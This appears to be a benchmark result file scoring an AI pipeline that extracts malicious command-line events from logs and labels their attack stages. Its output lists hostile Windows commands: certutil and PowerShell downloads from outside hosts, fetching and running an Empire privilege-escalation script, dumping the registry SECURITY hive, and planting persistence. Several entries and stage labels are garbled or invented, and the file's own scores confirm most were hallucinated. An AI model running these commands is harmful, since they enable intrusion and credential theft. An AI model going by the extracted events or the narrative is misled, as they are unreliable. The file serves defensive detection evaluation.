@@ -1,0 +1,135 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "certutil -urlcache -split -f http://example.com/x.exe C:\\x.exe",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "certutil -urlcache -split -f http://example.com/x.exe C:\\x.exe",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "cmd.exe /C T1059.006.py",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C .\\47\\?.*\\.ps1",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \\\"Start-Process .\\T1059.003_script.bat\\\"",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1134.001 -TestNumbers 1\"",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \\.\\chromeremoteservices.ps1\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "\u00bf net group domain admins /domain ",
+        "stage": "Discovery"
+      },
+      {
+        "command": "CERTUTIL.EXE URLCACHE SPLIT F HTTPS://1RUSSIA[.]XYZ/BROWSON.DLL",
+        "stage": "Execution"
+      },
+      {
+        "command": "REG ADD HKEY_LOCAL_MACHINE\\SOFTWARE\\MICROSOFT\\WINDOWS\\CURRENTVERSION\\POLICIES\\EXPLORER\\RUN /V TEST /T REG_SZ /D C:\\WINDOWSSYSTEM32CALC.EXE /F",
+        "stage": "Persistence"
+      },
+      {
+        "command": "\\??\\C:\\USERS\\ADMINISTRATOR\\APPDATA\\ROAMING\\MICROSOFT\\WINDOWS\\START MENU\\PROGRAMS\\STARTUP\\SQLLDR.EXE *",
+        "stage": "Persistence"
+      },
+      {
+        "command": "powerShell.exe -executionpolicy bypass -c start-process $env:temp\\t1059.003_script.bat\"",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C invoke-systemmanagement T1036.004 -DetailedInfo -FullDetails",
+        "stage": "Discovery"
+      },
+      {
+        "command": "SCHTASKS.EXE /CREATE /TN TEST /TR C:\\TEST\\1053.005.BAT /SC ONLOGON",
+        "stage": "Persistence"
+      },
+      {
+        "command": "CertUtil -UrlCache -Split -f Http://124.223.85.207:8082/Test.Hta",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "reg.exe save hkey_local_machine\\security c:\\users\\administrator\\appdata\\local\\temp\\tjbvkjpetfjp",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C set-rubenauacpolicy; invoke-uacccheck; invoke-memorystoredump,\" enableLocaladmin; addcurrentusertoadministratorsgroup; get-winpeb; disableuseraccountcontrol; installservice ,...,  \"disablememoryprotection;killprocesseshandle; createmutexes; overwritefilesindirectories WHETHER RUNNING AS SYSTEM\",  \"addgrouppartnership<USERNAME> ADMINISTRATORS; getdocumentsondesktop =",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method POST -UseBasicParsing -ContentType application\\/json",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C [net.servicepointmanager]::securityprotocol =[net.securityprotocoltype]:tls12 iex (iwr 'Https://Raw.Githubusercontent.Com/Bc-Security/Empire/F6Efdd5A96Fd424A1F983d884b637Da868e5Df466/Data/Module_Source/Privesc/Get-System.Ps1 '-usebasicparsing);get-system-techniquenamedpipe-verbose",
+        "stage": "Execution"
+      },
+      {
+        "command": "Del /F /S Lsass_dump.Dmp",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -executionpolicy bypass -c invoke-webrequest http://124.223.085.107:8082/test.hta -method post",
+        "stage": "Lateral Movement"
+      }
+    ],
+    "narrative": "The attacker's initial access vector appears to be through exploits and downloads of executables using certutil.exe, certutil, cmd.exe, and powershell.exe. This leads to the execution of adversary controlled code, which includes downloading additional components, executing system management commands, persisting on the system, and collecting sensitive information. The attackers then steal accounts, modify system configurations, create backdoors and proxy servers, and move laterally between hosts. Throughout the attack, the attackers attempt to evade detection by modifying logs, removing potential forensic artifacts, and disabling memory protection.",
+    "_parse_ok": false,
+    "_cost": {
+      "llm_calls": 6,
+      "prompt_tokens": 93770,
+      "completion_tokens": 7315,
+      "total_tokens": 101085,
+      "wall_clock_s": 110.251,
+      "parse_retries": 1
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.14285714285714285,
+      "recall": 0.08108108108108109,
+      "f1": 0.10344827586206896,
+      "tp": 3,
+      "fp": 18,
+      "fn": 34
+    },
+    "stage": {
+      "precision": 0.0,
+      "recall": 0.0,
+      "f1": 0.0,
+      "tp": 0,
+      "fp": 21,
+      "fn": 37,
+      "recall_partial": 0.04054054054054054
+    },
+    "hallucination_rate": 0.6666666666666666,
+    "cost": {
+      "llm_calls": 6,
+      "prompt_tokens": 93770,
+      "completion_tokens": 7315,
+      "total_tokens": 101085,
+      "wall_clock_s": 110.251,
+      "parse_retries": 1
+    }
+  },
+  "meta": {
+    "variant": "v4_triage",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA A100 80GB PCIe",
+    "triage": true
+  }
+}
